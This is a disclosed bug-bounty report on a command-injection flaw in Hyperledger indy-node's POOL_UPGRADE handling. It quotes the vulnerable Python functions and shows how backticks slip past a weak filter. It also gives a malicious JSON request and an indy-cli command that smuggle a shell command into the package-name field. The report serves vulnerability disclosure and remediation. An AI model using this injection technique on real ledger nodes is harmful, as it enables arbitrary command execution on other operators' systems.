# [indy_node]POOL_UPGRADE command injection, Trustee Node can execute command in any other Node`s system.

## Report Details
- **Report ID**: 1859592
- **URL**: https://hackerone.com/reports/1859592
- **State**: Closed
- **Severity**: none
- **Submitted**: 2023-02-02T14:44:12.257Z
- **Disclosed**: 2023-04-27T14:48:14.887Z

## Reporter
- **Username**: kmhlyxj0
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: hyperledger

## Vulnerability Information
After I finish my report, I found project this is not part of the bounty program, so I also commit this report. This issue is related to the [https://github.com/hyperledger/indy-node](https://github.com/hyperledger/indy-node).

I found some function such as get_latest_pkg_version/_call_upgrade_script has  command injection vulnerability. 
node_control_utils.py:
```python
    def get_latest_pkg_version(cls,pkg_name: str,upstream: SourceVersion = None, update_cache: bool = True) -> PackageVersion:
        ...
        try:
            cmd = compose_cmd(
                ['apt-cache', 'show', pkg_name, '|', 'grep', '-E', "'^Version: '"]
            )
            output = cls.run_shell_script_extended(cmd).strip()
    ...
```
node_control_noe.py:
```python
    def _call_upgrade_script(self, pkg_name: str, pkg_ver: PackageVersion):
        logger.info(
            "Upgrading {} to package version {}, test_mode {}"
            .format(pkg_name, pkg_ver, int(self.test_mode))
        )

        deps = self._get_deps_list('{}={}'.format(pkg_name, pkg_ver))
        deps = '"{}"'.format(deps)

        cmd_file = 'upgrade_indy_node'
        if self.test_mode:
            cmd_file = 'upgrade_indy_node_test'

        cmd = compose_cmd([cmd_file, deps])
        NodeControlUtil.run_shell_script(cmd, timeout=self.timeout)
```
A Trustee can input a malicious package name to trigger this code.  There are two conditions for package name:
1. Valid package name prefix, here I choose `indy-node`.
2. Valid package version. Input value of version must bigger or equals than old version. If `reinstall` set to true, version can equal with the old version.
3. bypass the fileter function `compose_cmd`. I found  some special characters  filtered in `compose_cmd` , that is `;|&&`:
```python
def compose_cmd(cmd):
    if os.name != 'nt':
        cmd = ' '.join(cmd)
        cmd = re.split(";|&&", cmd.splitlines()[0], 1)[0].rstrip()
    return cmd
```
But the special character \`, is still valid to inject command. So I can input a package name , for example: indy-node2 \`touch /tmp/12345678\` . Finally The malicious POOL_UPGRADE request looks as follows:
```json
{
    "identifier": "V4SGRU86Z58d6TV7PBUe6f",
    "operation": {
        "action": "start",
        "name": "test",
        "package": "indy-node2 `touch /tmp/1234567`",
        "schedule": {
            "Gw6pDLhcBcoQesN72qfotTgFa7cbuqZpkX3Xo6pLhPhv":"2023-02-02T15:30:05.258870+00:00",
            "8ECVSk179mjsjKRLWiQtssMLgp6EPhWXtaYyStWPSGAb":"2023-02-02T17:32:05.258870+00:00",
            "DKVxG2fXXTU8yT5N7hGEbXB3dfdAnYv1JczDUHpmDxya":"2023-02-02T14:31:05.258870+00:00",
            "4PS3EDQ3dW1tci1Bp6543CfuuebjFrg36kLAUcskGfaA":"2023-02-02T19:39:05.258870+00:00"
        },
        "sha256": "db34a72a90d026dae49c3b3f0436c8d3963476c77468ad955845a1ccf7b03f55",
        "type": "109",
        "reinstall": true,
        "version": "1.12.6"
    },
    "protocolVersion": 2,
    "reqId": 1651152851,
    "signature": "4YoXKHNnWRouTUAW4fKuTANnXNJfY2JoPG4PoXfz4PUzjx4NySrAmzkzy6zCiRRf5uczZx5mQVSm1eCZLnUHUDoT"
}
```
Step to reproduce(use indy-cli):
1. use indy-cli, Use a `TRUSTEE` DID:

{F2150453} 

2. Run ledger pool_upgrade command, such as:

```
ledger pool-upgrade name="security_test2" version=1.12.6 action=start sha256=f284bdc3c1c9e24a494e285cb387c69510f28de51c15bb93179d9c7f28705398 schedule={"Gw6pDLhcBcoQesN72qfotTgFa7cbuqZpkX3Xo6pLhPhv":"2023-02-02T15:30:05.258870+00:00","8ECVSk179mjsjKRLWiQtssMLgp6EPhWXtaYyStWPSGAb":"2023-02-02T14:32:05.258870+00:00","DKVxG2fXXTU8yT5N7hGEbXB3dfdAnYv1JczDUHpmDxya":"2023-02-02T13:31:05.258870+00:00","4PS3EDQ3dW1tci1Bp6543CfuuebjFrg36kLAUcskGfaA":"2023-02-02T12:53:05.258870+00:00"} package="indy-node `touch /tmp/1234567`" reinstall=true
```
3. wait for schedule, you can what happend in `/var/log/indy/node_control.log`:

{F2150481}

## Impact

A Trustee Node can execute command in any other Node`s system.

## Attachments
- image.png
- image.png
